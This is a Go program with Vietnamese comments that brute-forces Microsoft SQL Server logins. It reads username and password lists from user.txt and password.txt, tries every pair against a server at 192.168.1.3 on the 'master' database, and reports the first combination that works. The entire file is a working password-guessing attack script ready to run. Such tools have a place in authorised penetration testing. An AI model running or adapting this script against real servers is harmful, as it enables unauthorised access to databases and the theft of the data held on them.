package main

import (
    "bufio"
    "database/sql"
    "fmt"
    "log"
    "os"

    _ "github.com/denisenkom/go-mssqldb"
)

// Đọc các dòng từ file và trả về danh sách các dòng
func readLines(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        lines = append(lines, scanner.Text())
    }
    if err := scanner.Err(); err != nil {
        return nil, err
    }
    return lines, nil
}

// Thử kết nối đến SQL Server với tên người dùng và mật khẩu
func tryLogin(server, database, username, password string) bool {
    connString := fmt.Sprintf("server=%s;database=%s;user id=%s;password=%s", server, database, username, password)
    db, err := sql.Open("mssql", connString)
    if err != nil {
        return false
    }
    defer db.Close()

    err = db.Ping()
    if err != nil {
        return false
    }
    return true
}

// Thực hiện brute force với các tên người dùng và mật khẩu từ file
func bruteForce(server, database string) {
    usernames, err := readLines("user.txt")
    if err != nil {
        log.Fatalf("Error reading user.txt: %v", err)
    }

    passwords, err := readLines("password.txt")
    if err != nil {
        log.Fatalf("Error reading password.txt: %v", err)
    }

    for _, username := range usernames {
        for _, password := range passwords {
            fmt.Printf("Trying Username: %s, Password: %s\n", username, password)
            if tryLogin(server, database, username, password) {
                fmt.Printf("Success! Username: %s, Password: %s\n", username, password)
                return
            } else {
                fmt.Printf("Failed Username: %s, Password: %s\n", username, password)
            }
        }
    }
}

func main() {
    server := "192.168.1.3"  // Thay đổi theo địa chỉ server của bạn
    database := "master"   // Thay đổi theo cơ sở dữ liệu bạn muốn kiểm tra
    bruteForce(server, database)
}
